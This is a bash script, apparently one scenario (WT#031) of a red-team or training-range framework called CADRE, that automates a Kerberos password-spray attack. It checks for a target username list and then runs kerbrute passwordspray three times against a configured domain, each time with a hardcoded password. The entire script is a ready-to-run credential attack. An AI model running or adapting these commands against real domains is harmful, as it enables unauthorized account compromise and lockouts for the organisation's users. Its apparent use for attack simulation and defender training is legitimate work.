#!/bin/bash
# CADRE — WT#031 Password Spray
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#031 — Password Spray"
start_attack "031" "Password Spray"

require_tool kerbrute
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Verify user wordlist exists"
run_cmd "ls -la /tmp/users.txt 2>/dev/null || echo 'WARNING: Create /tmp/users.txt with target usernames (one per line)'"

step "Step 2: Spray chief_command password across all users"
run_cmd "kerbrute passwordspray -d $DOMAIN_ROOT /tmp/users.txt 'C0mm@nd_Ch1ef!'"

step "Step 3: Spray analyst_dfir password across all users"
run_cmd "kerbrute passwordspray -d $DOMAIN_ROOT /tmp/users.txt 'An@lyst_DF1R!'"

step "Step 4: Spray cloud analyst password"
run_cmd "kerbrute passwordspray -d $DOMAIN_ROOT /tmp/users.txt 'Cl0ud_An@lyst!'"

result $? "Password Spray completed"
